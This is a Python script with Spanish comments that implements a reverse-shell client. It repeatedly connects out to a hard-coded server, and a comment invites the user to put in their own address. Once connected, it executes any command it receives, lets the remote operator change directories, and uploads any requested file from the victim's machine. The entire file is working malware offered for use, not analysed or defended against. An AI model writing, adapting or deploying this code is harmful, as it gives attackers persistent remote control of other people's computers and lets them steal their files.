from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep
import os
# Cambiar el server_address con el ip y port del tuyo
server_address = ('1.1.1.1', 9196)
while True:
    try:
        client_socket = socket()
        try:
            client_socket.connect(server_address)
        except Exception as e:
            sleep(50)
            continue 

        estado = True

        while estado:
            try:
                buffer_size_data = client_socket.recv(4).decode().strip()
                if not buffer_size_data:
                    print("No se recibio tamaño de comando. Reintentando...")
                    continue
                
                buffer_size = int(buffer_size_data)

                comando = client_socket.recv(buffer_size).decode()
                if not comando:
                    print("No se recibio comando. Reintentando...")
                    continue

                print(f"Comando recibido: {comando}")

                if comando.strip().lower() == 'exit':
                    print("Cerrando conexión...")
                    client_socket.close()
                    estado = False
                elif comando.split(" ")[0].lower() == 'cd':
                    try:
                        chdir(" ".join(comando.split(" ")[1:]))
                        ruta_actual = getcwd()
                        contenido = getoutput('dir' if os.name == 'nt' else 'ls')
                        respuesta = f"Ruta actual: {ruta_actual}\nContenido:\n{contenido}"
                    except Exception as e:
                        respuesta = f"Error al cambiar de directorio: {e}"
                    client_socket.send(f"{len(respuesta):04}".encode())
                    client_socket.send(respuesta.encode())
                elif comando.split(" ")[0].lower() == 'dwnld':
                    try:
                        ruta_archivo = " ".join(comando.split(" ")[1:])
                        with open(ruta_archivo, 'rb') as archivo:
                            contenido = archivo.read()
                        respuesta = contenido
                        mensaje = f"Archivo enviado: {ruta_archivo}"
                    except FileNotFoundError:
                        respuesta = b""
                        mensaje = f"Error: Archivo no encontrado en {ruta_archivo}"
                    except Exception as e:
                        respuesta = b""
                        mensaje = f"Error al leer el archivo: {e}"

                    client_socket.send(f"{len(respuesta):04}".encode())
                    client_socket.send(respuesta)

                    client_socket.send(f"{len(mensaje):04}".encode())
                    client_socket.send(mensaje.encode())

                else:
                    salida = getoutput(comando)
                    client_socket.send(f"{len(salida):04}".encode())
                    client_socket.send(salida.encode())

                sleep(0.1)

            except Exception as e:
                client_socket.close()
                sleep(50)
                break
    except Exception as e:
        sleep(50)